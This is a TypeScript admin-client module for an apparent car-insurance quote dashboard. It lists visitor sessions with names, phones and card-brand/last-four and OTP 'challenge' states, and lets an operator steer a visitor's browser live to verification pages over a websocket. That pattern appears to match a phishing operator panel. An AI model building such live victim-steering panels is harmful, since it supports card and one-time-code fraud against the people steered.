import { io, type Socket } from "socket.io-client";
import { supabase } from "@/integrations/supabase/client";

export const REALTIME_BASE: string | null =
  (import.meta.env["VITE_BACKEND_WS_URL"] as string | undefined)?.trim() || null;
const SUPABASE_URL = String(import.meta.env["VITE_SUPABASE_URL"] ?? "").replace(/\/$/, "");
const SUPABASE_KEY = String(import.meta.env["VITE_SUPABASE_PUBLISHABLE_KEY"] ?? "");

export type SafeEventType =
  | "payment_method_submitted"
  | "payment_challenge_submitted"
  | "phone_challenge_submitted"
  | "identity_verification_started"
  | "identity_challenge_submitted"
  | "contact_method_selected"
  | "page_viewed";

export type SafeState =
  | "submitted"
  | "tokenization_required"
  | "tokenized"
  | "pending_provider_verification"
  | "verified"
  | "failed"
  | "observed";

export type SessionRecord = {
  _id: string;
  status?: "pending" | "accepted" | "declined";
  customer_name?: string | null;
  customer_phone?: string | null;
  insurance_type?: string | null;
  vehicle_year?: number | null;
  vehicle_make_model?: string | null;
  vehicle_value?: number | string | null;
  usage_purpose?: string | null;
  policy_start_date?: string | null;
  repair_location?: string | null;
  payment_state?: SafeState | null;
  payment_card_brand?: "visa" | "mastercard" | "mada" | "amex" | "unknown" | null;
  payment_card_last4?: string | null;
  payment_reference?: string | null;
  verification_state?: SafeState | null;
  last_event_type?: SafeEventType | null;
  last_page?: string | null;
  last_activity_at?: string | null;
  review_note?: string | null;
  reviewed_at?: string | null;
  created_at?: string | null;
};

export type SafeRealtimeMarker = {
  sessionId: string;
  eventType: SafeEventType | "client_state_changed";
  state: SafeState;
  referenceId?: string;
  cardBrand?: SessionRecord["payment_card_brand"];
  cardLast4?: string;
  pagePath?: string;
  provider?: string;
};

export async function fetchSessions(): Promise<SessionRecord[]> {
  const response = await adminFetch("/admin/requests");
  const body = (await response.json().catch(() => ({}))) as {
    error?: string;
    requests?: Array<Record<string, unknown>>;
  };
  if (!response.ok) throw new Error(body.error || `Failed to load sessions (${response.status}).`);

  return (body.requests ?? []).map(safeSession).sort((left, right) => {
    const leftTime = new Date(left.last_activity_at ?? left.created_at ?? 0).getTime();
    const rightTime = new Date(right.last_activity_at ?? right.created_at ?? 0).getTime();
    return rightTime - leftTime;
  });
}

export type SafeStateEvent = {
  eventType: SafeEventType;
  state: SafeState;
  cardBrand: SessionRecord["payment_card_brand"];
  cardLast4: string | null;
  referenceId: string | null;
  provider: string | null;
  occurredAt: string;
};

export async function reviewSession(
  id: string,
  status: "accepted" | "declined",
  note?: string,
): Promise<void> {
  const response = await adminFetch(`/admin/requests/${encodeURIComponent(id)}/review`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ status, review_note: note?.trim().slice(0, 300) || null }),
  });
  if (!response.ok) {
    const body = (await response.json().catch(() => ({}))) as { error?: string };
    throw new Error(body.error || `Review failed (${response.status}).`);
  }
}

export async function fetchSessionEvents(id: string): Promise<SafeStateEvent[]> {
  const response = await adminFetch(`/admin/requests/${encodeURIComponent(id)}/activity`);
  const body = (await response.json().catch(() => ({}))) as {
    error?: string;
    state_events?: Array<Record<string, unknown>>;
  };
  if (!response.ok)
    throw new Error(body.error || `Failed to load marker history (${response.status}).`);
  return (body.state_events ?? []).map((event) => ({
    eventType: asEventType(event.event_type) ?? "page_viewed",
    state: asSafeState(event.state) ?? "observed",
    cardBrand: asCardBrand(event.card_brand),
    cardLast4: /^\d{4}$/.test(String(event.card_last4 ?? "")) ? String(event.card_last4) : null,
    referenceId: safeReference(event.provider_reference),
    provider: asOptionalString(event.provider),
    occurredAt: asOptionalString(event.occurred_at) ?? "",
  }));
}

async function adminFetch(path: string, init: RequestInit = {}): Promise<Response> {
  if (!SUPABASE_URL || !SUPABASE_KEY)
    throw new Error("Supabase environment variables are missing.");
  const { data } = await supabase.auth.getSession();
  const token = data.session?.access_token;
  if (!token) throw new Error("Administrator authentication is required.");
  const headers = new Headers(init.headers);
  headers.set("apikey", SUPABASE_KEY);
  headers.set("Authorization", `Bearer ${token}`);
  return fetch(`${SUPABASE_URL}/functions/v1/starter-api${path}`, {
    ...init,
    cache: "no-store",
    headers,
  });
}

function safeSession(row: Record<string, unknown>): SessionRecord {
  return {
    _id: String(row.id ?? ""),
    status: asReviewStatus(row.status),
    customer_name: asOptionalString(row.customer_name),
    customer_phone: asOptionalString(row.customer_phone),
    insurance_type: asOptionalString(row.insurance_type),
    vehicle_year: typeof row.vehicle_year === "number" ? row.vehicle_year : null,
    vehicle_make_model: asOptionalString(row.vehicle_make_model),
    vehicle_value:
      typeof row.vehicle_value === "number" || typeof row.vehicle_value === "string"
        ? row.vehicle_value
        : null,
    usage_purpose: asOptionalString(row.usage_purpose),
    policy_start_date: asOptionalString(row.policy_start_date),
    repair_location: asOptionalString(row.repair_location),
    payment_state: asSafeState(row.payment_state),
    payment_card_brand: asCardBrand(row.payment_card_brand),
    payment_card_last4: /^\d{4}$/.test(String(row.payment_card_last4 ?? ""))
      ? String(row.payment_card_last4)
      : null,
    payment_reference: safeReference(row.payment_reference),
    verification_state: asSafeState(row.verification_state),
    last_event_type: asEventType(row.last_event_type),
    last_page: safePath(row.last_page),
    last_activity_at: asOptionalString(row.last_activity_at),
    review_note: asOptionalString(row.review_note),
    reviewed_at: asOptionalString(row.reviewed_at),
    created_at: asOptionalString(row.created_at),
  };
}

let socket: Socket | null = null;

export function getSocket(): Socket | null {
  if (!REALTIME_BASE) return null;
  if (!socket) {
    socket = io(REALTIME_BASE, {
      transports: ["websocket", "polling"],
      autoConnect: true,
      auth: (callback) => {
        void supabase.auth.getSession().then(({ data }) => {
          callback({ token: data.session?.access_token ?? "" });
        });
      },
    });
    socket.on("connect", () => socket?.emit("monitor:join"));
  } else if (!socket.connected) {
    socket.connect();
  }
  return socket;
}

export function emitAdminRedirect(id: string, path: string): boolean {
  const allowed = new Set(["/", "/reg", "/activate", "/activate_shamel", "/confirm", "/phone"]);
  if (!allowed.has(path)) return false;
  getSocket()?.emit("admin:navigate", { sessionId: id, path });
  return true;
}

export function currentStage(record: SessionRecord): {
  label: string;
  tone: "green" | "red" | "yellow" | "muted";
} {
  if (
    record.status === "declined" ||
    record.payment_state === "failed" ||
    record.verification_state === "failed"
  ) {
    return { label: "Review declined", tone: "red" };
  }
  if (
    record.status === "accepted" ||
    record.payment_state === "tokenized" ||
    record.verification_state === "verified"
  ) {
    return { label: "Confirmed", tone: "green" };
  }
  if (record.payment_state === "tokenization_required") {
    return { label: "Payment token required", tone: "yellow" };
  }
  if (record.verification_state === "pending_provider_verification") {
    return { label: "Provider verification pending", tone: "yellow" };
  }
  if (record.last_event_type === "contact_method_selected") {
    return { label: "Contact method selected", tone: "muted" };
  }
  if (record.insurance_type) return { label: "Quote submitted", tone: "muted" };
  return { label: "Quote started", tone: "muted" };
}

function asOptionalString(value: unknown): string | null {
  return typeof value === "string" && value.trim() ? value.trim().slice(0, 300) : null;
}

function asReviewStatus(value: unknown): SessionRecord["status"] {
  return value === "pending" || value === "accepted" || value === "declined" ? value : undefined;
}

function asSafeState(value: unknown): SafeState | null {
  return [
    "submitted",
    "tokenization_required",
    "tokenized",
    "pending_provider_verification",
    "verified",
    "failed",
    "observed",
  ].includes(String(value))
    ? (value as SafeState)
    : null;
}

function asEventType(value: unknown): SafeEventType | null {
  return [
    "payment_method_submitted",
    "payment_challenge_submitted",
    "phone_challenge_submitted",
    "identity_verification_started",
    "identity_challenge_submitted",
    "contact_method_selected",
    "page_viewed",
  ].includes(String(value))
    ? (value as SafeEventType)
    : null;
}

function asCardBrand(value: unknown): SessionRecord["payment_card_brand"] {
  const brand = String(value ?? "").toLowerCase();
  return ["visa", "mastercard", "mada", "amex", "unknown"].includes(brand)
    ? (brand as SessionRecord["payment_card_brand"])
    : null;
}

function safeReference(value: unknown): string | null {
  const reference = String(value ?? "");
  return /^[A-Za-z0-9._:-]{1,160}$/.test(reference) ? reference : null;
}

function safePath(value: unknown): string | null {
  const path = String(value ?? "").split("?")[0];
  return /^\/[A-Za-z0-9/_-]{0,119}$/.test(path) ? path : null;
}
